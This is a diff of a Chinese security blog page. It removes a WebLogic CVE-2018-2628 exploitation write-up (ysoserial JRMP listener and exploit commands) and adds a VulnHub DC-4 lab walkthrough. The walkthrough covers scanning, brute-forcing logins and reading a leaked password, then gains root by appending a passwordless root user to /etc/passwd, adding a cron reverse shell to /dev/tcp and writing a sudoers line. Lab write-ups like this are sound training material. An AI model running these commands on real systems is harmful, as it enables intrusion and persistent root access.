@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="WebLogic-CVE-2018-2826复现, PlayZG">
+    <meta name="keywords" content="Vulnhub DC-4, PlayZG">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>WebLogic-CVE-2018-2826复现 | PlayZG</title>
+    <title>Vulnhub DC-4 | PlayZG</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">WebLogic-CVE-2018-2826复现</h1>
+                    <h1 class="description center-align post-title">Vulnhub DC-4</h1>
                 </div>
             </div>
         </div>
@@ -431,8 +431,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/WebLogic/">
-                                <span class="chip bg-color">WebLogic</span>
+                            <a href="/tags/%E9%9D%B6%E6%9C%BA/">
+                                <span class="chip bg-color">靶机</span>
                             </a>
                         
                     </div>
@@ -447,7 +447,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-05-04
+                    2021-11-14
                 </div>
                 
 
@@ -456,7 +456,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    763
+                    808
                 </div>
                 
 
@@ -473,68 +473,97 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="WebLogic-反序列化远程代码执行漏洞-CVE-2018-2628"><a href="#WebLogic-反序列化远程代码执行漏洞-CVE-2018-2628" class="headerlink" title="WebLogic 反序列化远程代码执行漏洞(CVE-2018-2628)"></a>WebLogic 反序列化远程代码执行漏洞(CVE-2018-2628)</h1><h2 id="weblogic简介"><a href="#weblogic简介" class="headerlink" title="weblogic简介"></a>weblogic简介</h2><blockquote>
-<p>来自维基百科</p>
-</blockquote>
-<p><strong>WebLogic</strong>是美商<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Oracle">Oracle</a>的主要产品之一，系购并得来。是商业市场上主要的<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Java">Java</a>（J2EE）应用<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E4%BC%BA%E6%9C%8D%E5%99%A8">服务器</a>软件（application server）之一，是世界上第一个成功商业化的J2EE应用服务器，目前已推出到14c（14.1.1.0.0）版。而此产品也延伸出WebLogic Portal, WebLogic Integration等企业用的中间件（但目前Oracle主要以Fusion Middleware融合中间件来取代这些WebLogic Server之外的企业包），以及OEPE（Oracle Enterprise Pack for Eclipse）开发工具。</p>
-<p>WebLogic最早由WebLogic Inc.开发，后并入BEA公司，最终BEA公司又并入Oracle公司                                                                                                                                                                                                  </p>
-<p>在功能性上，Weblogic是Java EE的全能应用服务器，包括EJB 、JSP、servlet、JMS等，是商业软件里排名第一的容器（JSP、servlet、EJB等），并提供其他工具（例如Java编辑器），因此也是一个综合的开发及运行环境。在扩展性上，Weblogic Server凭借其出色的群集技术，拥有处理关键Web应用系统问题所需的性能、可扩展性和高可用性</p>
-<h2 id="CVE-2018-2628"><a href="#CVE-2018-2628" class="headerlink" title="CVE-2018-2628"></a>CVE-2018-2628</h2><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>攻击者利用其他rmi绕过weblogic黑名单限制，然后在将加载的内容利用readObject解析，从而造成攻击者可以在未授权的情况下远程执行代码。所有开放weblogic控制台7001端口，默认会开启T3服务，攻击者只需要发送精心构造的T3协议数据，就可以获取目标服务器的权限。攻击者可利用该漏洞控制组件，影响数据的可用性、保密性和完整性。</p>
-<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul>
-<li>10.3.6.0.0</li>
-<li>12.1.3.0.0</li>
-<li>12.2.1.2.0</li>
-<li>12.2.1.3</li>
-</ul>
-<p><img src="https://i.loli.net/2021/05/02/3bWXYAgeDmIK4aV.png" alt="2.png"></p>
-<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>使用<code>vulhub</code>搭建环境复现环境</p>
-<p><strong>验证漏洞</strong></p>
-<ul>
-<li>nmap -n -v -Pn 7001,7002 192.168.134.132 –script=weblogic-t3-info</li>
-</ul>
-<p><img src="https://i.loli.net/2021/05/02/GHtRwF3sPqYbegU.png" alt="1.png"></p>
-<p>漏洞验证<code>https://github.com/Lighird/CVE-2018-2628</code></p>
-<p>需要将<code>url.txt</code>将里面的IP 改成目标IP，出现 is vul CVE-2018-2628 说明漏洞存在</p>
-<p><img src="https://i.loli.net/2021/05/03/ogVd7PJGBz1WQmE.png" alt="7.png"></p>
-<ul>
-<li><p>首先需要启动一个JRMP Server，可以利用ysoserial(下载地址:<a target="_blank" rel="noopener" href="https://github.com/brianwrf/ysoserial/releases/tag/0.0.6-pri-beta">https://github.com/brianwrf/ysoserial/releases/tag/0.0.6-pri-beta</a>)<br>利用ysoserial启动一个JRMP Server</p>
-<blockquote>
-<p>java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [监听端口] CommonsCollections1 “命令”</p>
-</blockquote>
-</li>
-</ul>
-<p><img src="https://i.loli.net/2021/05/02/RLDTdWAhkiIHy2z.png" alt="3.png"></p>
-<ul>
-<li><p>然后利用该exp进行攻击,可见成功上传文件(下载地址:<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/44553">https://www.exploit-db.com/exploits/44553</a>)</p>
-<blockquote>
-<p>python cve2018-2628.py 192.168.134.132 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 192.168.134.128 2021 JRMPClient</p>
-<p>192.168.134.132 7001靶机跟目标端口</p>
-<p>192.168.134.128 2021 JRMP Server 的IP跟端口</p>
-<p>ysoserial-0.0.6-SNAPSHOT-BETA-all.jar本地路径</p>
-<p>JRMPClien是执行JRMPClient的类</p>
-</blockquote>
-</li>
-</ul>
-<p><img src="https://i.loli.net/2021/05/02/IYvTF4PRwMVfo8Z.png" alt="6.png"></p>
-<ul>
-<li>进入靶机可以查到创建了文件</li>
-</ul>
-<p><img src="https://i.loli.net/2021/05/03/pq87nCBPFJte1kE.png" alt="5.png"></p>
-<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>这里需要<strong>进行一次编码</strong></p>
-<p>转化工具链接 : <code>http://www.jackson-t.ca/runtime-exec-payloads.html</code></p>
-<p><img src="https://i.loli.net/2021/05/03/MyUvtszRP2Xj8G5.png" alt="11.png"></p>
-<p><strong>启动一个JRMP Server，exp进行攻击</strong></p>
-<p><img src="https://i.loli.net/2021/05/03/S1WgCjQGrV58MNh.png" alt="10.png"></p>
-<p><img src="https://i.loli.net/2021/05/02/IYvTF4PRwMVfo8Z.png" alt="6.png"></p>
-<p><strong>监听端口</strong></p>
-<p><img src="https://i.loli.net/2021/05/03/DlKV69SjuqYkMxg.png" alt="9.png"></p>
-<h3 id="修复意见"><a href="#修复意见" class="headerlink" title="修复意见"></a>修复意见</h3><ul>
-<li>打官方补丁</li>
-<li>关闭T3服务</li>
-</ul>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><code>https://mp.weixin.qq.com/s/nYY4zg2m2xsqT0GXa9pMGA</code></p>
-<p><code>https://blog.csdn.net/whatday/article/details/107720033</code></p>
-<p><code>https://blog.csdn.net/csacs/article/details/87122472</code></p>
+                <h1 id="VulnHub-DC-4靶机学习"><a href="#VulnHub-DC-4靶机学习" class="headerlink" title="VulnHub DC-4靶机学习"></a>VulnHub DC-4靶机学习</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>首先进行一下主机发现，得到靶机的<code>IP</code>地址，方便后续操作</p>
+<p><strong>arp-sacn -l</strong></p>
+<pre class=" language-php"><code class="language-php">sudo arp<span class="token operator">-</span>scan <span class="token operator">-</span>l                                                                                                                                                                                                                   
+<span class="token keyword">Interface</span><span class="token punctuation">:</span> eth0<span class="token punctuation">,</span> type<span class="token punctuation">:</span> <span class="token constant">EN10MB</span><span class="token punctuation">,</span> <span class="token constant">MAC</span><span class="token punctuation">:</span> <span class="token number">00</span><span class="token punctuation">:</span>0c<span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">:</span><span class="token number">62</span><span class="token punctuation">:</span><span class="token number">70</span><span class="token punctuation">:</span><span class="token number">32</span><span class="token punctuation">,</span> IPv4<span class="token punctuation">:</span> <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">20.17</span>
+Starting arp<span class="token operator">-</span>scan <span class="token number">1.9</span><span class="token punctuation">.</span><span class="token number">7</span> with <span class="token number">256</span> <span class="token function">hosts</span> <span class="token punctuation">(</span>https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//github.com/royhills/arp-scan)</span>
+<span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">20.2</span>    <span class="token number">00</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">:</span><span class="token number">56</span><span class="token punctuation">:</span>ef<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token number">30</span>       VMware<span class="token punctuation">,</span> Inc<span class="token punctuation">.</span>
+<span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">20.10</span>   <span class="token number">00</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">:</span><span class="token number">56</span><span class="token punctuation">:</span>c0<span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">08</span>       VMware<span class="token punctuation">,</span> Inc<span class="token punctuation">.</span>
+<span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">20.42</span>   <span class="token number">00</span><span class="token punctuation">:</span>0c<span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">:</span>e8<span class="token punctuation">:</span>c4<span class="token punctuation">:</span>8b       VMware<span class="token punctuation">,</span> Inc<span class="token punctuation">.</span>
+<span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">20.254</span>  <span class="token number">00</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">:</span><span class="token number">56</span><span class="token punctuation">:</span>eb<span class="token punctuation">:</span><span class="token number">18</span><span class="token punctuation">:</span><span class="token number">18</span>       VMware<span class="token punctuation">,</span> Inc<span class="token punctuation">.</span>
+
+<span class="token number">4</span> packets received by filter<span class="token punctuation">,</span> <span class="token number">0</span> packets dropped by kernel
+Ending arp<span class="token operator">-</span>scan <span class="token number">1.9</span><span class="token punctuation">.</span><span class="token number">7</span><span class="token punctuation">:</span> <span class="token number">256</span> hosts scanned in <span class="token number">2.467</span> <span class="token function">seconds</span> <span class="token punctuation">(</span><span class="token number">103.77</span> hosts<span class="token operator">/</span>sec<span class="token punctuation">)</span><span class="token punctuation">.</span> <span class="token number">4</span> responded</code></pre>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><strong>sudo nmap -A -sT 192.168.20.42</strong></p>
+<pre class=" language-php"><code class="language-php"><span class="token constant">PORT</span>   <span class="token constant">STATE</span> <span class="token constant">SERVICE</span> <span class="token constant">VERSION</span>
+<span class="token number">22</span><span class="token operator">/</span>tcp open  ssh     OpenSSH <span class="token number">7</span><span class="token punctuation">.</span>4p1 Debian <span class="token number">10</span><span class="token operator">+</span><span class="token function">deb9u6</span> <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
+<span class="token operator">|</span> ssh<span class="token operator">-</span>hostkey<span class="token punctuation">:</span> 
+<span class="token operator">|</span>   <span class="token number">2048</span> 8d<span class="token punctuation">:</span><span class="token number">60</span><span class="token punctuation">:</span><span class="token number">57</span><span class="token punctuation">:</span><span class="token number">06</span><span class="token punctuation">:</span>6c<span class="token punctuation">:</span><span class="token number">27</span><span class="token punctuation">:</span>e0<span class="token punctuation">:</span>2f<span class="token punctuation">:</span><span class="token number">76</span><span class="token punctuation">:</span>2c<span class="token punctuation">:</span>e6<span class="token punctuation">:</span><span class="token number">42</span><span class="token punctuation">:</span>c0<span class="token punctuation">:</span><span class="token number">01</span><span class="token punctuation">:</span>ba<span class="token punctuation">:</span><span class="token function">25</span> <span class="token punctuation">(</span><span class="token constant">RSA</span><span class="token punctuation">)</span>
+<span class="token operator">|</span>   <span class="token number">256</span> e7<span class="token punctuation">:</span><span class="token number">83</span><span class="token punctuation">:</span>8c<span class="token punctuation">:</span>d7<span class="token punctuation">:</span>bb<span class="token punctuation">:</span><span class="token number">84</span><span class="token punctuation">:</span>f3<span class="token punctuation">:</span>2e<span class="token punctuation">:</span>e8<span class="token punctuation">:</span>a2<span class="token punctuation">:</span>5f<span class="token punctuation">:</span><span class="token number">79</span><span class="token punctuation">:</span>6f<span class="token punctuation">:</span>8e<span class="token punctuation">:</span><span class="token number">19</span><span class="token punctuation">:</span><span class="token function">30</span> <span class="token punctuation">(</span><span class="token constant">ECDSA</span><span class="token punctuation">)</span>
+<span class="token operator">|</span>_  <span class="token number">256</span> fd<span class="token punctuation">:</span><span class="token number">39</span><span class="token punctuation">:</span><span class="token number">47</span><span class="token punctuation">:</span>8a<span class="token punctuation">:</span>5e<span class="token punctuation">:</span><span class="token number">58</span><span class="token punctuation">:</span><span class="token number">33</span><span class="token punctuation">:</span><span class="token number">99</span><span class="token punctuation">:</span><span class="token number">73</span><span class="token punctuation">:</span><span class="token number">73</span><span class="token punctuation">:</span>9e<span class="token punctuation">:</span><span class="token number">22</span><span class="token punctuation">:</span>7f<span class="token punctuation">:</span><span class="token number">90</span><span class="token punctuation">:</span>4f<span class="token punctuation">:</span><span class="token function">4b</span> <span class="token punctuation">(</span><span class="token constant">ED25519</span><span class="token punctuation">)</span>
+<span class="token number">80</span><span class="token operator">/</span>tcp open  http    nginx <span class="token number">1.15</span><span class="token punctuation">.</span><span class="token number">10</span>
+<span class="token operator">|</span>_http<span class="token operator">-</span>server<span class="token operator">-</span>header<span class="token punctuation">:</span> nginx<span class="token operator">/</span><span class="token number">1.15</span><span class="token punctuation">.</span><span class="token number">10</span>
+<span class="token operator">|</span>_http<span class="token operator">-</span>title<span class="token punctuation">:</span> System Tools
+<span class="token constant">MAC</span> Address<span class="token punctuation">:</span> <span class="token number">00</span><span class="token punctuation">:</span><span class="token constant">0C</span><span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">:</span><span class="token constant">E8</span><span class="token punctuation">:</span><span class="token constant">C4</span><span class="token punctuation">:</span><span class="token function">8B</span> <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
+Device type<span class="token punctuation">:</span> general purpose
+Running<span class="token punctuation">:</span> Linux <span class="token number">3</span><span class="token punctuation">.</span>X<span class="token operator">|</span><span class="token number">4</span><span class="token punctuation">.</span>X
+<span class="token constant">OS</span> <span class="token constant">CPE</span><span class="token punctuation">:</span> cpe<span class="token punctuation">:</span><span class="token operator">/</span>o<span class="token punctuation">:</span>linux<span class="token punctuation">:</span>linux_kernel<span class="token punctuation">:</span><span class="token number">3</span> cpe<span class="token punctuation">:</span><span class="token operator">/</span>o<span class="token punctuation">:</span>linux<span class="token punctuation">:</span>linux_kernel<span class="token punctuation">:</span><span class="token number">4</span>
+<span class="token constant">OS</span> details<span class="token punctuation">:</span> Linux <span class="token number">3.2</span> <span class="token operator">-</span> <span class="token number">4.9</span>
+Network Distance<span class="token punctuation">:</span> <span class="token number">1</span> hop
+Service Info<span class="token punctuation">:</span> <span class="token constant">OS</span><span class="token punctuation">:</span> Linux<span class="token punctuation">;</span> <span class="token constant">CPE</span><span class="token punctuation">:</span> cpe<span class="token punctuation">:</span><span class="token operator">/</span>o<span class="token punctuation">:</span>linux<span class="token punctuation">:</span>linux_kernel
+
+<span class="token constant">TRACEROUTE</span>
+<span class="token constant">HOP</span> <span class="token constant">RTT</span>     <span class="token constant">ADDRESS</span>
+<span class="token number">1</span>   <span class="token number">1.14</span> ms <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">20.42</span>
+
+<span class="token constant">OS</span> <span class="token keyword">and</span> Service detection performed<span class="token punctuation">.</span> Please report any incorrect results at https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//nmap.org/submit/ .</span>
+Nmap done<span class="token punctuation">:</span> <span class="token number">1</span> <span class="token constant">IP</span> <span class="token function">address</span> <span class="token punctuation">(</span><span class="token number">1</span> host up<span class="token punctuation">)</span> scanned in <span class="token number">9.61</span> seconds</code></pre>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p><strong>访问80端口</strong></p>
+<p><img src="https://i.loli.net/2021/11/10/V8uDK5UkxMPpybF.png" alt="1.png"></p>
+<p>一个登录页面，提示用<strong>admin</strong>账号，用<strong>bp</strong>爆破试一下，爆出密码为<strong>happy</strong></p>
+<p><img src="https://i.loli.net/2021/11/10/iBFtc3zPudIfj6H.png" alt="2.png"></p>
+<p>登录之后发现可以执行命令</p>
+<p><img src="https://i.loli.net/2021/11/10/xuyb4lzd2gRYLBw.png" alt="3.png"></p>
+<p>用<strong>bp</strong>抓一下，看一下能不能控制执行的命令</p>
+<p><img src="https://i.loli.net/2021/11/10/1yhL7TFeQwR25Gi.png" alt="4.png"></p>
+<p><img src="https://i.loli.net/2021/11/10/8QmG3iq1INyYk79.png" alt="5.png"></p>
+<p><strong>sam</strong>家目录下面没有什么东西，<strong>jim</strong>家目录下面备份文件，当时没注意，当爆破<strong>jim</strong>账号的时候一直爆不出来，后来看备份文件的内容明白要拿这些内容作为密码进行爆破，最后得到<strong>jim</strong>的密码</p>
+<p><img src="https://i.loli.net/2021/11/10/mqNjfln7LtAGuMp.png" alt="6.png"></p>
+<p><img src="https://i.loli.net/2021/11/10/mxrlSXkA6TY1nZ7.png" alt="7.png"></p>
+<p>登录之后发现好像<strong>SUID</strong>提权都不行，<strong>SUDO</strong>命令不行执行</p>
+<p>发现家目录下面有个<code>mbox</code>文件，查看是<strong>root</strong>用户发送给<strong>jim</strong>用户的邮件，然后查看**/var/mail/**邮件</p>
+<p><strong>jim</strong>写给<strong>charles</strong>的邮件，并且里面有账号密码，登录试试</p>
+<pre class=" language-php"><code class="language-php">From charles@dc<span class="token number">-4</span> Sat Apr <span class="token number">06</span> <span class="token number">21</span><span class="token punctuation">:</span><span class="token number">15</span><span class="token punctuation">:</span><span class="token number">46</span> <span class="token number">2019</span>
+<span class="token keyword">Return</span><span class="token operator">-</span>path<span class="token punctuation">:</span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>charles@dc-4</span><span class="token punctuation">></span></span></span>
+Envelope<span class="token operator">-</span>to<span class="token punctuation">:</span> jim@dc<span class="token number">-4</span>
+Delivery<span class="token operator">-</span>date<span class="token punctuation">:</span> Sat<span class="token punctuation">,</span> <span class="token number">06</span> Apr <span class="token number">2019</span> <span class="token number">21</span><span class="token punctuation">:</span><span class="token number">15</span><span class="token punctuation">:</span><span class="token number">46</span> <span class="token operator">+</span><span class="token number">1000</span>
+Received<span class="token punctuation">:</span> from charles by dc<span class="token number">-4</span> with <span class="token function">local</span> <span class="token punctuation">(</span>Exim <span class="token number">4.89</span><span class="token punctuation">)</span>
+        <span class="token punctuation">(</span>envelope<span class="token operator">-</span>from <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>charles@dc-4</span><span class="token punctuation">></span></span></span><span class="token punctuation">)</span>
+        id 1hCjIX<span class="token operator">-</span>0000kO<span class="token operator">-</span>Qt
+        <span class="token keyword">for</span> jim@dc<span class="token number">-4</span><span class="token punctuation">;</span> Sat<span class="token punctuation">,</span> <span class="token number">06</span> Apr <span class="token number">2019</span> <span class="token number">21</span><span class="token punctuation">:</span><span class="token number">15</span><span class="token punctuation">:</span><span class="token number">45</span> <span class="token operator">+</span><span class="token number">1000</span>
+To<span class="token punctuation">:</span> jim@dc<span class="token number">-4</span>
+Subject<span class="token punctuation">:</span> Holidays
+<span class="token constant">MIME</span><span class="token operator">-</span>Version<span class="token punctuation">:</span> <span class="token number">1.0</span>
+Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> text<span class="token operator">/</span>plain<span class="token punctuation">;</span> charset<span class="token operator">=</span><span class="token string">"UTF-8"</span>
+Content<span class="token operator">-</span>Transfer<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> 8bit
+Message<span class="token operator">-</span>Id<span class="token punctuation">:</span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>E1hCjIX-0000kO-Qt@dc-4</span><span class="token punctuation">></span></span></span>
+From<span class="token punctuation">:</span> Charles <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>charles@dc-4</span><span class="token punctuation">></span></span></span>
+Date<span class="token punctuation">:</span> Sat<span class="token punctuation">,</span> <span class="token number">06</span> Apr <span class="token number">2019</span> <span class="token number">21</span><span class="token punctuation">:</span><span class="token number">15</span><span class="token punctuation">:</span><span class="token number">45</span> <span class="token operator">+</span><span class="token number">1000</span>
+Status<span class="token punctuation">:</span> O
+
+Hi Jim<span class="token punctuation">,</span>
+
+I'm heading off on holidays at the end of today<span class="token punctuation">,</span> so the boss asked me to give you my password just in <span class="token keyword">case</span> anything goes wrong<span class="token punctuation">.</span>
+
+Password is<span class="token punctuation">:</span>  <span class="token operator">^</span>xHhA<span class="token operator">&amp;</span>hvim0y
+
+See ya<span class="token punctuation">,</span>
+Charles</code></pre>
+<p>登录之后<strong>SUID</strong>提权好像也不行，但是<strong>SUDO</strong>里面有一个<strong>teehee</strong>命令</p>
+<p><img src="https://i.loli.net/2021/11/10/7l8T3mBC45WYezi.png" alt="8.png"></p>
+<p><img src="https://i.loli.net/2021/11/10/qUl7rzVwspeGFmM.png" alt="9.png"></p>
+<p><strong>-a</strong>在文件最后新追加一行</p>
+<p>1.<strong>添加账号</strong></p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">echo</span> <span class="token string">"z::0:0:::/bin/bash"</span> <span class="token operator">|</span> sudo teehee <span class="token operator">-</span>a <span class="token operator">/</span>etc<span class="token operator">/</span>passwd</code></pre>
+<p><img src="https://i.loli.net/2021/11/10/TslbyY6BtvHPeqj.png" alt="10.png"></p>
+<p><img src="https://i.loli.net/2021/11/10/3TFYgzC7KSb2nWP.png" alt="11.png"></p>
+<p>2.<strong>定时任务</strong></p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">echo</span> <span class="token string">'* * * * * root bash -c "bash -i  >&amp; /dev/tcp/192.168.20.17/6666 0>&amp;1"'</span><span class="token operator">|</span> sudo teehee <span class="token operator">-</span>a <span class="token operator">/</span>etc<span class="token operator">/</span>crontab
+<span class="token keyword">echo</span> <span class="token string">"* * * * * root chmod 4777 /bin/sh"</span><span class="token operator">|</span> sudo teehee <span class="token operator">-</span>a <span class="token operator">/</span>etc<span class="token operator">/</span>crontab</code></pre>
+<p>3.<strong>sudoers文件</strong></p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">echo</span> <span class="token string">"charles ALL=(ALL:ALL) ALL"</span> <span class="token operator">|</span> sudo teehee <span class="token operator">-</span>a <span class="token operator">/</span>etc<span class="token operator">/</span>sudoers</code></pre>
+<p><img src="https://i.loli.net/2021/11/10/QaCeKtRhybuDLsj.png" alt="12.png"></p>
 
                 
             </div>
@@ -561,7 +590,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/05/04/WebLogic-CVE-2018-2826%E5%A4%8D%E7%8E%B0/">http://example.com/2021/05/04/WebLogic-CVE-2018-2826%E5%A4%8D%E7%8E%B0/</a>
+                    <a href="http://example.com/2021/11/14/Vulnhub-DC-4/">http://example.com/2021/11/14/Vulnhub-DC-4/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -599,8 +628,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/WebLogic/">
-                                    <span class="chip bg-color">WebLogic</span>
+                                <a href="/tags/%E9%9D%B6%E6%9C%BA/">
+                                    <span class="chip bg-color">靶机</span>
                                 </a>
                             
                         </div>
@@ -774,13 +803,13 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2021/05/11/WebLogic-CVE-2020-14882-14883/">
+                <a href="/2021/11/24/TP5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="WebLogic-CVE-2020-14882&amp;14883复现">
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="TP5反序列化学习">
                         
-                        <span class="card-title">WebLogic-CVE-2020-14882&amp;14883复现</span>
+                        <span class="card-title">TP5反序列化学习</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -791,7 +820,7 @@
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-05-11
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-11-24
                         </span>
                         <span class="publish-author">
                             
@@ -804,8 +833,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/WebLogic/">
-                        <span class="chip bg-color">WebLogic</span>
+                    <a href="/tags/TP5/">
+                        <span class="chip bg-color">TP5</span>
                     </a>
                     
                 </div>
@@ -819,13 +848,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/05/04/WebLogic/">
+                <a href="/2021/11/09/blueCMS-v1-6/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="WebLogic-CVE-2017-10271复现">
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="blueCMS v1.6">
                         
-                        <span class="card-title">WebLogic-CVE-2017-10271复现</span>
+                        <span class="card-title">blueCMS v1.6</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -836,7 +865,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-05-04
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-09
                             </span>
                         <span class="publish-author">
                             
@@ -849,8 +878,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/WebLogic/">
-                        <span class="chip bg-color">WebLogic</span>
+                    <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                        <span class="chip bg-color">代码审计</span>
                     </a>
                     
                 </div>
